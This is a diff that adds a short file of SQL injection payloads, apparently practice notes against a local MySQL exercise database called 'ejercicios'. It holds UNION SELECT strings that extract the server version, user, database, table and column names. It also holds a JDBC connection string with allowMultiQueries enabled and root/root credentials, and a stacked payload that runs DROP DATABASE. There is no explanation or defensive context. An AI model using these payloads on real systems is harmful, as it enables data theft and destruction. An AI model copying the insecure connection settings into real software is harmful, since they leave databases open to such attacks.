@@ -1,0 +1,15 @@
+ingredientes UNION SELECT NULL, concat(version(),' | ',user())
+
+
+ingredientes UNION SELECT NULL, database()
+
+ingredientes UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='ingredientes'
+
+
+ingredientes UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys')
+
+
+
+"jdbc:mysql://localhost:3308/ejercicios?allowMultiQueries=true", "root","root");
+
+ingredientes; DROP DATABASE ejercicios; SELECT 1
